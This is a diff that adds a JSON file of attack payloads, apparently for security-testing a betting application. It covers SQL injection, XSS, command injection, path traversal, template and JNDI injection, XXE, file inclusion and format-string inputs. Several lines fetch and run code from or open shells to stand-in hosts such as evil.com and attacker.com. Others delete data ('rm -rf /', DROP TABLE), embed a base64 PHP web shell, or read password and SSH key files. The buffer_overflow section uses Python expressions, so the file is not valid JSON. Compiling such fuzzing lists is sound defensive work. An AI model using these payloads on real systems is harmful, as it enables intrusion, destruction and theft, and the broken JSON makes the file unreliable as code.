@@ -1,0 +1,166 @@
+{
+  "sql_injection": [
+    "' OR '1'='1",
+    "'; DROP TABLE users; --",
+    "admin'--",
+    "' UNION SELECT * FROM users --",
+    "'; INSERT INTO bets VALUES (999, 'fake'); --",
+    "1' OR '1'='1' /*",
+    "'; EXEC xp_cmdshell('dir'); --",
+    "' OR 1=1 #",
+    "'; DELETE FROM accounts WHERE '1'='1'; --",
+    "user'; WAITFOR DELAY '00:00:05'; --"
+  ],
+  "xss_injection": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<iframe src=javascript:alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<select onfocus=alert('XSS') autofocus>",
+    "<textarea onfocus=alert('XSS') autofocus>",
+    "<keygen onfocus=alert('XSS') autofocus>",
+    "<marquee onstart=alert('XSS')>",
+    "<video><source onerror=alert('XSS')>"
+  ],
+  "command_injection": [
+    "; ls -la",
+    "| cat /etc/passwd",
+    "&& whoami",
+    "; rm -rf /",
+    "| nc attacker.com 4444",
+    "&& curl evil.com/malware.sh | sh",
+    "; wget evil.com/backdoor.py",
+    "| python -c \"import os; os.system('rm -rf /')\"",
+    "&& echo $PATH",
+    "; id && uname -a"
+  ],
+  "path_traversal": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "....//....//....//etc//passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "../../../proc/self/environ",
+    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
+    "/var/log/apache2/access.log",
+    "../../../home/user/.ssh/id_rsa",
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  ],
+  "template_injection": [
+    "{{7*7}}",
+    "${7*7}",
+    "#{7*7}",
+    "{{config.items()}}",
+    "${jndi:ldap://evil.com/a}",
+    "{{''.__class__.__mro__[2].__subclasses__()}}",
+    "${T(java.lang.System).getProperty('user.dir')}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "${#context['xwork.MethodAccessor.denyMethodExecution']=false}",
+    "{{lipsum.__globals__['os'].popen('whoami').read()}}"
+  ],
+  "ldap_injection": [
+    "${jndi:ldap://evil.com/a}",
+    "${jndi:rmi://evil.com/a}",
+    "${jndi:dns://evil.com/a}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+    "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com}",
+    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
+    "${jndi:nis://evil.com/a}",
+    "${jndi:nds://evil.com/a}",
+    "${jndi:corba://evil.com/a}",
+    "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}"
+  ],
+  "nosql_injection": [
+    "'; return true; var x='",
+    "\\'; return true; var x=\\'",
+    "1; return true",
+    "{$where: 'return true'}",
+    "'; return this.username == 'admin'; var x='",
+    "{$ne: null}",
+    "{$regex: '.*'}",
+    "{$gt: ''}",
+    "[$ne]=1",
+    "admin'||'1'=='1"
+  ],
+  "xml_injection": [
+    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
+    "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/malicious.dtd\">]>",
+    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://evil.com/malicious.dtd\"> %xxe;]>",
+    "</script><script>alert('XSS')</script>",
+    "CDATA[<script>alert('XSS')</script>]]>",
+    "<?xml-stylesheet type=\"text/xsl\" href=\"http://evil.com/malicious.xsl\"?>"
+  ],
+  "file_inclusion": [
+    "php://filter/read=convert.base64-encode/resource=index.php",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+    "expect://whoami",
+    "file:///etc/passwd",
+    "php://input",
+    "zip://shell.jpg%23shell.php",
+    "phar://shell.phar/shell.php",
+    "http://evil.com/shell.txt",
+    "ftp://evil.com/shell.php",
+    "php://filter/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+  ],
+  "buffer_overflow": [
+    "A" * 1000,
+    "B" * 2000,
+    "C" * 5000,
+    "\\x41" * 1000,
+    "\\x90" * 100 + "\\xCC" * 4,
+    "%" + "A" * 1000,
+    "${" + "A" * 1000 + "}",
+    "{{" + "A" * 1000 + "}}",
+    "<" + "A" * 1000 + ">",
+    "[" + "A" * 1000 + "]"
+  ],
+  "format_string": [
+    "%x%x%x%x%x%x%x%x",
+    "%s%s%s%s%s%s%s%s",
+    "%n%n%n%n%n%n%n%n",
+    "%08x.%08x.%08x.%08x",
+    "%1000d%1000d%1000d",
+    "%.1000000d",
+    "%*1000000d",
+    "%#1000000x",
+    "%1000000s",
+    "%100000000d"
+  ],
+  "business_logic": [
+    {
+      "field": "bet_amount",
+      "values": [-100, 0, 0.001, 999999999, "NaN", "Infinity", "-Infinity"],
+      "description": "Invalid betting amounts to test business logic"
+    },
+    {
+      "field": "match_id", 
+      "values": [-1, 0, 999999, "null", "undefined", "admin"],
+      "description": "Invalid match IDs to test validation"
+    },
+    {
+      "field": "odds",
+      "values": [-1, 0, 1000000, "NaN", "Infinity"],
+      "description": "Invalid odds values"
+    },
+    {
+      "field": "user_id",
+      "values": [-1, 0, 999999, "admin", "root", "../other_user"],
+      "description": "User ID manipulation attempts"
+    }
+  ],
+  "unicode_bypass": [
+    "＜script＞alert('XSS')＜/script＞",
+    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
+    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
+    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+    "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "\\u0027 OR \\u00271\\u0027=\\u00271",
+    "\\u002e\\u002e/\\u002e\\u002e/etc/passwd",
+    "\\uFF1C\\uFF53\\uFF43\\uFF52\\uFF49\\uFF50\\uFF54\\uFF1E",
+    "test\\u0000admin",
+    "admin\\u0009\\u000a\\u000d"
+  ]
+}
